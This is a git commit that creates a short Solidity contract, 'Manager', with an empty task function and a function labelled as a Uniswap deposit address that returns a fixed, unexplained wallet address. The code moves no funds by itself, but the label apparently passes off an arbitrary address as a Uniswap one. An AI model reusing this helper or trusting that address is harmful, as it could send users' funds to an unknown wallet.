540d089d9837b7a2e622870276f31a3d8c2ca521
mike00fuller <72899417+mike00fuller@users.noreply.github.com>
2021-07-11 11:40:50 -0400

    Create managerdos.sol

---
+++ managerdos.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xc5d948744Df6b7601964eB14Abc32dCD55c7A767;
+	}
+}
